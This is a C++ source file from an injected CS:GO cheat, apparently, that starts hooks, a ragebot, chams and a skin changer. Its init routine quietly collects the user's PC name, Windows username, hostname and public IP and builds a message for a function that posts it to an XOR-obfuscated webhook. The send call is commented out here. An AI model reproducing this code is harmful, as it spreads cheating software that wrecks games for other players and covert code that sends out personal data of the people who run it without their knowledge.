#include "globals.hpp"
#include "legacy ui/legacy_str.h"
#include "features.hpp"
#include <wininet.h>

CURL* curl_v2;
CURLcode res;

#ifndef _MAC
#define MAX_COMPUTERNAME_LENGTH 15
#else
#define MAX_COMPUTERNAME_LENGTH 31
#endif

char buffer[MAX_COMPUTERNAME_LENGTH + 1];
std::string username_smb = "";
void update_player_name()
{
	static std::string old_username;
	static std::string username = HACKS->cvar->find_convar("name")->get_string();

	if (username != old_username)
	{
		old_username = username;
		username_smb = username;
	}
}

std::string getIPAddress() {
	HINTERNET hInternet = InternetOpenA(CXOR("MyApp"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	std::string ipAddress;

	if (hInternet) {
		HINTERNET hConnect = InternetOpenUrlA(hInternet, CXOR("https://ipinfo.io/ip"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (hConnect) {
			char buffer[256];
			DWORD bytesRead;

			if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
				buffer[bytesRead] = '\0';
				ipAddress = buffer;
			}

			InternetCloseHandle(hConnect);
		}

		InternetCloseHandle(hInternet);
	}

	return ipAddress;
}

std::string format(const char* fmt, ...) {
	int size = 512;
	char* buffer = 0;
	buffer = new char[size];
	va_list vl;
	va_start(vl, fmt);
	int nsize = vsnprintf(buffer, size, fmt, vl);
	if (size <= nsize) { //fail delete buffer and try again
		delete[] buffer;
		buffer = 0;
		buffer = new char[nsize + 1]; //+1 for /0
		nsize = vsnprintf(buffer, size, fmt, vl);
	}
	std::string ret(buffer);
	va_end(vl);
	delete[] buffer;
	return ret;
}

void web_hook_throw_smb(std::string info)
{
	std::string field = "{\"content\": null,\"embeds\": [{\"title\": \"%s\",\"description\": \"%s\",\"color\": 4062976}],\"attachments\": []}";
	curl_v2 = curl_easy_init();
	if (curl_v2) {
		struct curl_slist* headers = nullptr;
		headers = curl_slist_append(headers, "Content-Type: application/json");

		curl_easy_setopt(curl_v2, CURLOPT_URL, XOR("only beta"));
		curl_easy_setopt(curl_v2, CURLOPT_POSTFIELDS, format(field.c_str(), username_smb.c_str(), info.c_str()).c_str());
		curl_easy_setopt(curl_v2, CURLOPT_HTTPHEADER, headers);

		res = curl_easy_perform(curl_v2);

		curl_slist_free_all(headers);
		curl_easy_cleanup(curl_v2);
	}
}

#ifndef _DEBUG
#endif


#ifdef _DEBUG
FILE* stream = NULL;

void create_console()
{
	AllocConsole();
	freopen_s(&stream, ("CONIN$"), ("r"), stdin);
	freopen_s(&stream, ("CONOUT$"), ("w"), stdout);
	freopen_s(&stream, ("CONOUT$"), ("w"), stderr);
}

void destroy_console()
{
	HWND console = GetConsoleWindow();
	FreeConsole();
	PostMessage(console, WM_CLOSE, 0, 0);
	fclose(stream);
}
#endif

INLINE void init_listeners()
{
	LISTENER_ENTITY->init();
	LISTENER_EVENT->init();
}

INLINE void remove_listeners()
{
	LISTENER_ENTITY->remove();
	LISTENER_EVENT->remove();
}

void c_hacks::init_local_player()
{
	local = **offsets::local.cast<c_cs_player***>();

	if (!local || !local->is_alive())
	{
		weapon = nullptr;
		weapon_info = nullptr;
		return;
	}

	weapon = local->get_handle_entity<c_base_combat_weapon>(local->active_weapon());
	if (weapon)
		weapon_info = weapon_system->get_weapon_data(weapon->item_definition_index());
}

void c_hacks::init_main(LPVOID reserved)
{
	init(reserved);
}

#define INFO_BUFFER_SIZE 32767
TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;

std::string info_smb = "";

#include "windows.h"
#include <Lmcons.h>

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>

void check_host_name(int hostname) { //This function returns host name for local computer
	if (hostname == -1) {
		perror("gethostname");
		exit(1);
	}
}

void check_host_entry(struct hostent* hostentry) { //find host info from host name
	if (hostentry == NULL) {
		perror("gethostbyname");
		exit(1);
	}
}

void IP_formatter(char* IPbuffer) { //convert IP string to dotted decimal format
	if (NULL == IPbuffer) {
		perror("inet_ntoa");
		exit(1);
	}
}


void c_hacks::init(LPVOID reserved)
{
#ifdef _DEBUG
	create_console();

	DEBUG_LOG("Welcome to debug mode \n");
	DEBUG_LOG("Build date: %s \n\n", __DATE__);
#endif

	while (!(window = WINCALL(FindWindowA)(CXOR("Valve001"), NULL)))
		std::this_thread::sleep_for(std::chrono::milliseconds(200));

	while (!WINCALL(GetModuleHandleA)(CXOR("serverbrowser.dll")))
		std::this_thread::sleep_for(std::chrono::milliseconds(200));

	DEBUG_LOG(" [+] Modules \n");
	modules.init(false);
	
	DEBUG_LOG(" [+] Offsets \n");
	offsets::init();

	DEBUG_LOG(" [+] Xored strings \n");
	xor_strs::init();

	DEBUG_LOG(" [+] Configs \n");
	config::create_config_folder();

	DEBUG_LOG(" [+] Interfaces \n");
	init_interfaces(); 

	DEBUG_LOG(" [+] Listeners \n");
	init_listeners();
	 
	DEBUG_LOG(" [+] Convars \n");
	convars.init();

	DEBUG_LOG(" [+] Netvars \n");
	netvars::init();

	DEBUG_LOG(" [+] Threads \n");
	THREAD_POOL->init();

	DEBUG_LOG(" [+] Skin parser \n");
	skin_changer::init_parser();

	DEBUG_LOG(" [+] Update screen size \n");
	RENDER->update_screen();

	DEBUG_LOG(" [+] Reset GUI & Binds \n");
	g_menu.reset_init();
	g_cfg.reset_init();

	DEBUG_LOG(" [+] Chams materials \n");
	CHAMS->init_materials();

	DEBUG_LOG(" [+] Rage seeds \n");
	RAGEBOT->build_seeds();

	DEBUG_LOG(" [+] Post processing offsets \n");
	POST_PROCESSING->init();

	DEBUG_LOG(" [+] Sky name \n");
	WORLD_MODULATION->update_real_sky_name();

	DEBUG_LOG(" [+] EXE Path \n");
	exe_path = main_utils::get_executable_file_path();
	exe_path.erase(exe_path.end() - 8, exe_path.end());
	exe_path.append(CXOR("\\csgo\\"));

	DEBUG_LOG(" [+] Hooks \n");
	hooks::init();

	DWORD size;
	size = sizeof(buffer);
	GetComputerName(buffer, &size);

	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	char host[256];
	char* IP;
	struct hostent* host_entry;
	int hostname;
	hostname = gethostname(host, sizeof(host)); //find the host name
	check_host_name(hostname);
	host_entry = gethostbyname(host); //find host information
	check_host_entry(host_entry);
	IP = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list)); //Convert into IP string
	const char* user = username_smb.c_str();
	info_smb += XOR("PC Name: ");
	info_smb += XOR("**");
	info_smb += buffer;
	info_smb += XOR("**");
	info_smb += XOR(", ");
	info_smb += XOR("PC Username: ");
	info_smb += XOR("**");
	info_smb += username;
	info_smb += XOR("**");
	info_smb += XOR(", ");
	info_smb += XOR("Current Host Name: ");
	info_smb += XOR("**");
	info_smb += host;
	info_smb += XOR("**");
	info_smb += XOR(", ");
	info_smb += XOR("Host IP: ");
	info_smb += XOR("**");
	info_smb += getIPAddress();
	info_smb += XOR("**");

	std::this_thread::sleep_for(std::chrono::milliseconds(2000));

	//web_hook_throw_smb(info_smb.c_str());

	cheat_init = true;

#ifdef _DEBUG
	DEBUG_LOG(" [+] Updating entity listener \n\n");

	if (engine->is_connected() && engine->is_in_game())
		engine->execute_client_cmd("cl_fullupdate");
#endif

	DEBUG_LOG("Hack was injected successfuly! \n");

#ifdef _DEBUG
	while (!unload)
		std::this_thread::sleep_for(std::chrono::milliseconds(200));

	cheat_init = false;

	THREAD_POOL->remove();
	remove_listeners();
	hooks::remove();
	destroy_console();
	FreeLibraryAndExitThread(modules.dllmain, 0);
#endif
}

c_hacks::c_hacks()
{

}
